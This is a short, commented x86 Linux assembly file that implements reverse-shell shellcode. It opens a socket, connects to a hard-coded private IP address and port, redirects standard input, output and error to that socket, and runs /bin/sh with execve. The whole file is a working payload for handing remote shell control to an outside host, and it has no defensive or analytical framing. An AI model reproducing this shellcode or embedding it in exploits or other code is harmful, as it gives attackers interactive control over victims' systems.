global _start

section .text
_start:
;clear out registers, edx will be zero till the end of the code

       xor eax, eax
       xor ebx, ebx
       xor edx, edx
 
;create socket
;int socket(int domain, int type, int protocol)
;int socket(2, 1, 0)

 push eax
 push 0x01
 push 0x02
 mov ecx, esp      ; ecx points to the top of the stack where our arguments are located             
 mov al, 0x66
 inc bl                   ; 0x01
 int 0x80
 
 mov esi, eax     ; store socket descriptor to esi 

;connect to address
;int connect (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
;int connect(esi, struct, 0x10)

;sockaddr_in structure:

 mov al, 0x66
 mov bl, 0x03                        ; 0x03
 push edx            ; terminate
 push long 0xf30da8c0  ;ip_addr
 push word 0x300a        ; port number
 xor ecx, ecx
 mov cl, 0x02 
 push word cx
 mov ecx,esp    ; mov structure pointer in ecx                                      
 push 0x10
 push ecx
 push esi                        
 mov ecx, esp  ; ecx points to arguments
 int 0x80

 mov ebx,esi ; get new file descriptor for dup() call

;duplicate STD
;int dup2(int oldfd, int newfd)
;int dup2(ebx, 0)
  
         mov al,0x3f            ;63 in decimal
         xor ecx,ecx            ;0x00
         int 0x80

;int dup2(ebx, 1)

         mov al,0x3f
         inc ecx                   ;0x01
         int 0x80
     
;int dup2(ebx, 2)
    
         mov al,0x3f
         inc ecx                   ;0x02
         int 0x80
 
;spawn shell
;int execve(const char *filename, char *const argv[], char *const envp[]);
;int execve(string addr, zero, NULL)

  push edx                 ;string NULL-terminator
  push 0x68732f2f     ; hs//
  push 0x6e69622f    ; nib/
  mov ebx, esp          ; pointer to command string
  mov ecx, edx          ; ecx 0x00
  mov al, 0xb
  int 0x80
